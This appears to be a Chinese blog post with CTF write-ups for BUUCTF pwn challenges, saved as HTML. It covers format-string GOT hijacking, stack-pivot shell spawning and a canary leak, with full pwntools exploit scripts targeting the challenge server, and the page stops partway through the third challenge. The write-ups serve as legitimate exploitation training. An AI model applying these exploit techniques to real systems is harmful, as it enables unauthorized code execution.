@@ -1,0 +1,271 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>buu刷题-2 | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="axb_2019_fmt32checksec和检查运行流程 32为程序，开了NX和半开的RELRO  程序运行后会陷入一个类似无限循环的输入模式即输入一次后程序打印一次输入的内容并进行下一次输入准备 经过测试发现可能存在格式化字符串漏洞，用传统方式测试一下  我们发现在第八个位置上发现了我们输入的痕迹但我们明明输入的是4字节，但给出的结果并不是我们预想的 使用gdb调试进一步分析 这里我自己没有成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu刷题-2">
+<meta property="og:url" content="http://example.com/2021/08/26/buu%E5%88%B7%E9%A2%98-2/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="axb_2019_fmt32checksec和检查运行流程 32为程序，开了NX和半开的RELRO  程序运行后会陷入一个类似无限循环的输入模式即输入一次后程序打印一次输入的内容并进行下一次输入准备 经过测试发现可能存在格式化字符串漏洞，用传统方式测试一下  我们发现在第八个位置上发现了我们输入的痕迹但我们明明输入的是4字节，但给出的结果并不是我们预想的 使用gdb调试进一步分析 这里我自己没有成">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-08-26T01:36:32.000Z">
+<meta property="article:modified_time" content="2021-09-09T08:46:22.038Z">
+<meta property="article:author" content="徐小宇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/08/26/buu%E5%88%B7%E9%A2%98-2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-09-09 16:46:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">40</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#axb-2019-fmt32"><span class="toc-number">1.</span> <span class="toc-text">axb_2019_fmt32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%A3%80%E6%9F%A5%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">checksec和检查运行流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">使用gdb调试进一步分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">利用IDA进一步分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D"><span class="toc-number">4.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-s-4"><span class="toc-number">6.</span> <span class="toc-text">ciscn_2019_s_4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">7.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-1"><span class="toc-number">9.</span> <span class="toc-text">构思</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">9.1.</span> <span class="toc-text">小技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">10.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">10.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#others-babystack"><span class="toc-number"></span> <span class="toc-text">others_babystack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-1"><span class="toc-number">1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-2"><span class="toc-number">3.</span> <span class="toc-text">构思</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%A2%98%E7%9C%9F%E7%9A%84%E5%99%A9%E6%A2%A6%E6%89%8D%E5%88%9A%E5%88%9A%E5%BC%80%E5%A7%8B"><span class="toc-number">3.1.</span> <span class="toc-text">这题真的噩梦才刚刚开始</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">buu刷题-2</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-08-26T01:36:32.000Z" title="Created 2021-08-26 09:36:32">2021-08-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-09-09T08:46:22.038Z" title="Updated 2021-09-09 16:46:22">2021-09-09</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><h2 id="checksec和检查运行流程"><a href="#checksec和检查运行流程" class="headerlink" title="checksec和检查运行流程"></a>checksec和检查运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826094017784.png?raw=true" alt="image-20210826094017784.png"></p>
+<p>32为程序，开了NX和半开的RELRO</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826094059132.png?raw=true" alt="image-20210826094059132.png"></p>
+<p>程序运行后会陷入一个类似无限循环的输入模式即输入一次后程序打印一次输入的内容并进行下一次输入准备</p>
+<p>经过测试发现可能存在格式化字符串漏洞，用传统方式测试一下</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826094325258.png?raw=true" alt="image-20210826094325258.png"></p>
+<p>我们发现在第八个位置上发现了我们输入的痕迹但我们明明输入的是4字节，但给出的结果并不是我们预想的</p>
+<h3 id="使用gdb调试进一步分析"><a href="#使用gdb调试进一步分析" class="headerlink" title="使用gdb调试进一步分析"></a>使用gdb调试进一步分析</h3><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826094956875.png?raw=true" alt="image-20210826094956875.png"></p>
+<p>这里我自己没有成功调试出画面，这里借用其他大佬的结果和分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.是格式化字符串的指针，指向了栈上 format的位置   </span><br><span class="line">2 .是我们输入东西的位置的指针</span><br><span class="line">2. 是我们输入的东西存储的地方，，注意，以这个程序为例，他储存的地方是 0xfffcdaf 并不是一个对齐的地址，，覆盖的时候要注意</span><br><span class="line">这里的2的位置不对齐也证实了我们刚刚显示的结果为什么不是62626262</span><br></pre></td></tr></table></figure>
+
+<p>那么我们提前加入一个字符使得其对齐后再看看结果</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826095224927.png?raw=true" alt="image-20210826095224927.png"></p>
+<p>这样之后我们便得到了我们想要的结果</p>
+<p>为什么我们一定要让它这样显示呢？</p>
+<p>因为我们等等需要用到它来泄露地址，如果它的内容显示不是在一起的那么我们泄露的地址就会有错误</p>
+<h2 id="利用IDA进一步分析"><a href="#利用IDA进一步分析" class="headerlink" title="利用IDA进一步分析"></a>利用IDA进一步分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826095352272.png?raw=true" alt="image-20210826095352272.png"></p>
+<p>本题中<strong>s</strong>和<strong>format</strong>都没有栈溢出漏洞，而是存在格式化字符串漏洞</p>
+<p>并且在查找过程中发现程序中没有后门程序和system等关键字样</p>
+<h2 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h2><p>1.首先利用格式化字符串漏洞泄露地址</p>
+<p>2.再利用格式化字符串中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;&#39;byte&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>来修改got表的地址</p>
+<p>3.劫持got表来达成get_shell</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">#p &#x3D; process(&#39;axb_2019_fmt32&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;axb_2019_fmt32&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,28314)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23_32.so&#39;)</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&#39;Please tell me:&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39; + p32(read_got) + &#39;%8$s&#39;</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#p.recvuntil(&#39;b&#39;)</span><br><span class="line">read_addr &#x3D; u32(p.recv(18)[-4:])</span><br><span class="line">print hex(read_addr)</span><br><span class="line"></span><br><span class="line">#libc &#x3D; LibcSearcher(&#39;read&#39;,read_addr)</span><br><span class="line">libc_base &#x3D; read_addr - libc.symbols[&#39;read&#39;]</span><br><span class="line">#libc_base &#x3D; data - 0x0d4350</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">one_gadget &#x3D; libc_base + 0x3a80c</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Please tell me:&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39; +  fmtstr_payload(8, &#123;read_got:one_gadget&#125;,write_size &#x3D; &quot;byte&quot;,numbwritten &#x3D; 0xa)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里不知得为什么LibcSearcher不能搜到适合的Libc版本，于是我去buu上下了对应的资源包，然后利用</p>
+<p>介绍一下我们的fmtstr_payload函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：我们的偏移即我们刚开始算出的数字8</span><br><span class="line">第二个参数：&#123;a:b&#125;---即将a的内容改为b的内容对应了地址的修改</span><br><span class="line">第三个参数：我们输入的格式，这里是以字节输入</span><br><span class="line">第四个参数：是我们已经是输出的字符---这里为什么是10个呢？</span><br><span class="line">首先我们看到下面是我们打印的内容，前面有9个系统自动加的字符，并且我们因为对齐原因自己加了一个字符所以9+1&#x3D;0x10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826105514303.png?raw=true" alt="image-20210826105514303.png"></p>
+<h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a>ciscn_2019_s_4</h2><h2 id="checksec和查看运行流程"><a href="#checksec和查看运行流程" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826132013350.png?raw=true" alt="image-20210826132013350.png"></p>
+<p>32位的程序，开了NX和半开的RELRO</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826132056648.png?raw=true" alt="image-20210826132056648.png"></p>
+<p>程序运行时会进行两次输入，并且两次输入后都会打印一遍输入的内容</p>
+<p>检测下是否又格式化字符串漏洞</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826132157619.png?raw=true" alt="image-20210826132157619.png"></p>
+<p>发现并没有</p>
+<p>再尝试下溢出的效果</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826132229943.png?raw=true" alt="image-20210826132229943.png"></p>
+<p>发现溢出后会出现一串不可见的乱码—–&gt;这里的乱码代表了一个不可泄漏的地址，一般这种地址是该栈的地址</p>
+<h2 id="利用IDA分析"><a href="#利用IDA分析" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826132440152.png?raw=true" alt="image-20210826132440152.png"></p>
+<p>且程序中存在system函数</p>
+<h2 id="构思-1"><a href="#构思-1" class="headerlink" title="构思"></a>构思</h2><p>1.利用第一次输入时的溢出泄露栈地址</p>
+<p>2.第二次利用栈转移来实现get_shell</p>
+<p>那么我们先进行第一步泄露栈地址</p>
+<p>我们首先利用IDA分析完后可以知道为什么我们这里能泄露栈地址</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826133344815.png?raw=true" alt="image-20210826133344815.png"></p>
+<p>相应的我们利用payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*0x24 + &#39;bbbb&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210826131951242.png?raw=true" alt="image-20210826131951242.png"></p>
+<p>发送完payload后打下断点，我们标记两个红框</p>
+<p>1.是我们输入内容存放的位置</p>
+<p>2.ebp栈底的位置</p>
+<p>那么如果我们利用ebp-存放位置得出的结果就是一个偏移 == 0x38（注意这个偏移基本上是不会变的）</p>
+<p>那么我们只要利用语句接收了ebp的地址-0x38就可以得到栈的地址了</p>
+<h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>为什么我们这里用的是’a’*0x24 + ‘bbbb’</p>
+<p>这里是为了帮助我们去更好的定位我们接收的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#39;bbbb&#39;)</span><br><span class="line">stack_addr &#x3D; u32(p.recv(4)) - 0x38</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;ciscn_s_4&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_s_4&#39;)</span><br><span class="line">#p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27333)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">leave_ret &#x3D; 0x080484b8 </span><br><span class="line">system_addr &#x3D; 0x8048400</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x24+ &#39;bbbb&#39; </span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&#39;bbbb&#39;)</span><br><span class="line">stack_addr &#x3D; u32(p.recv(4).ljust(4,&#39;\x00&#39;)) - 0x38</span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload&#x3D;(p32(system_addr)+&#39;aaaa&#39;+p32(stack_addr+12)+&#39;&#x2F;bin&#x2F;sh\x00&#39;).ljust(0x28,&#39;a&#39;)+p32(stack_addr-4)+p32(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这里我们需要注意的是如果我们第一条Payload使用sendline构造发送的话就会一直报错，在第二次输入进行栈转移的过程中一直失败</p>
+<p>这里是我推测的错误原因</p>
+<p>sendline指发送后自动换行也就是说会多出一个字节那么我们就不能暴露正确的栈地址信息了</p>
+<h1 id="others-babystack"><a href="#others-babystack" class="headerlink" title="others_babystack"></a>others_babystack</h1><h2 id="checksec和查看运行流程-1"><a href="#checksec和查看运行流程-1" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827154600579.png?raw=true" alt="image-20210827154600579.png"></p>
+<p>64位程序只有PIE没有开，保护性很高</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827154639787.png?raw=true" alt="image-20210827154639787.png"></p>
+<p>是一个无线循环的菜单题目</p>
+<p>功能一是进行一次输入</p>
+<p>功能二是打印出最近一次的输入</p>
+<p>功能三是退出</p>
+<p>检测发现并不存在格式化字符串漏洞</p>
+<h2 id="利用IDA分析-1"><a href="#利用IDA分析-1" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827154908666.png?raw=true" alt="image-20210827154908666.png"></p>
+<p>并且在程序中没有找到相应的system等后门函数</p>
+<h2 id="构思-2"><a href="#构思-2" class="headerlink" title="构思"></a>构思</h2><p>1.首先我们需要想办法泄露canary才能利用栈溢出漏洞</p>
+<p>2.泄露完canary后利用栈溢出漏洞泄露libc</p>
+<p>3.利用泄露的libc查找关键词并结合栈溢出来get_shell</p>
+<p>那么我们先看第一步怎么泄露canary呢</p>
+<p>我们了解了canary的部分机制后发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">canary是存在ebp&#x2F;rbp前一个位置的保护机制，每一次要完成跳转时检测canary是否改变</span><br><span class="line">并且canary的组成是由7字节的随机数和最后一位的\x00</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827155244804.png?raw=true" alt="image-20210827155244804.png"></p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827155321765.png?raw=true" alt="image-20210827155321765.png"></p>
+<p>这两幅图分别是canary在IDA和GDB调试中的位置</p>
+<p>那么结合我们功能二中PUTS函数的性质</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts函数打印结尾的判断是是否遇到\x00</span><br><span class="line">那么我们canary最后一位刚好是\x00那么我们是不是可以先利用功能一填充到canary前一个的位置然后根据Canary的性质使得Puts打印出canary的值而结尾</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; pading --&gt; &#39;a&#39;*(0x90 - 0x8)					--刚好填充到canary的前一位</span><br><span class="line">p.sendline（payload）									--这里注意了发送必须是sendline如果是send会一直接收错误（巨坑）</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;2&#39;)</span><br><span class="line">p.recvuntil(&#39;a\n&#39;)										--这里利用a\n作为接收标记</span><br><span class="line">canary&#x3D;u64(p.recv(7).rjust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(canary)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827155812004.png?raw=true" alt="image-20210827155812004.png"></p>
+<p>接收时canary与aaa不再同一行所以是<strong>a\n</strong></p>
+<p>那么接下来就是熟悉的泄露libc了</p>
